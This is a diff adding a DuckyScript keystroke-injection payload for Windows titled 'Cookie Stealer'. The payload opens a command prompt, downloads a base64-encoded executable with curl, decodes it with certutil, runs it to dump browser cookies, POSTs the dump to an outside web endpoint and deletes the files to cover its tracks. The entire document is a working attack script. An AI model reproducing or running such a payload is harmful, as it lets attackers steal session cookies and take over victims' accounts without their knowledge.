@@ -1,0 +1,31 @@
+REM Title: Cookie Stealer
+REM Author: Quincy Cheng
+REM Description: Type and convert EXE from HEX, get the cookies and send them via REST API
+REM Target: Windows
+
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 1000
+STRING cd %USERPROFILE%\Desktop\
+ENTER
+DELAY 100 
+
+STRING  curl -s https://raw.githubusercontent.com/quincycheng/customer_experience_pod/main/cookie_base64.txt -o cookie_base64.txt   
+ENTER
+DELAY 2000
+
+STRING certutil -decode -f cookie_base64.txt cookie.exe 
+ENTER
+DELAY 1000
+STRING cookie.exe --json-print>body.txt
+ENTER
+DELAY 500
+STRING curl -X POST https://aap4062.flows.cyberark.cloud/api/v2/Quincy-CookieStealer/play -d @body.txt
+ENTER
+DELAY 200
+STRING del cookie_base64.txt  cookie.exe body.txt Cookies_decrypted
+ENTER
+STRING exit 
+ENTER
